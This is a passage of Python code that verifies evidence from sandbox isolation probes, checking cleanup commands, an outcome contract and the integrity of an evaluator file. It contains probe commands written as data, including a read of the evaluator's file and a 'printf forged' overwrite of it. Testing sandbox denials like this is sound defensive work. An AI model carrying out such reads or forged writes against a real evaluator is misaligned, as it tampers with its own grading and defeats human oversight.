    ] or by_name["evaluator-readback"].get("stdout") != (
        bundle_dir / "evaluator-after.txt"
    ).read_text():
        raise EvidenceVerificationError("evaluator readback drift")
    if by_name["image-remove"].get("argv") != [
        "docker", "image", "rm", environment["derived_image_digest"]
    ] or by_name["image-absence"].get("argv") != [
        "docker", "image", "inspect", environment["derived_image_digest"]
    ]:
        raise EvidenceVerificationError("derived image cleanup drift")
    if by_name["base-tag-remove"].get("argv") != [
        "docker", "image", "rm", temporary_base_tag
    ] or by_name["base-tag-absence"].get("argv") != [
        "docker", "image", "inspect", temporary_base_tag
    ]:
        raise EvidenceVerificationError("temporary base tag cleanup drift")
    if by_name["evaluator-read-deny"].get("argv", [])[-2:] != [
        "/usr/bin/cat", EVALUATOR_SANDBOX_PATH
    ]:
        raise EvidenceVerificationError("evaluator read command drift")
    if by_name["evaluator-mutation-deny"].get("argv", [])[-1:] != [
        f"printf forged > {EVALUATOR_SANDBOX_PATH}"
    ]:
        raise EvidenceVerificationError("evaluator mutation command drift")
    if by_name["evaluator-exfiltration-deny"].get("argv", [])[-1:] != [expected_exfiltration]:
        raise EvidenceVerificationError("evaluator exfiltration command drift")
    if outcome != {
        "schema": OUTCOME_SCHEMA,
        "verified_probes": ["writable-filesystem", "read-only-filesystem-deny", "network-allow",
                            "network-deny", "budget-abort", "evaluator-read-deny",
                            "evaluator-mutation-deny", "evaluator-exfiltration-deny", "teardown"],
        "unproven_probes": ["credential-broker"],
        "maturity_before": CURRENT_MATURITY,
        "maturity_after": CURRENT_MATURITY,
        "evaluator_artifact_digest": evaluator_artifact_digest,
        "outcome_digest": _digest_bytes(b"openshell-live-evidence-v1\n"),
    }:
        raise EvidenceVerificationError("outcome contract drift")
    if _digest_file(bundle_dir / "outcome.txt") != outcome["outcome_digest"]:
        raise EvidenceVerificationError("final state drift")
    if _digest_file(bundle_dir / "evaluator-after.txt") != evaluator_artifact_digest:
        raise EvidenceVerificationError("evaluator artifact mutation detected")
    return {"schema": VERIFICATION_SCHEMA, "verified": True,
            "maturity_decision": "unchanged", "unproven_probes": outcome["unproven_probes"]}
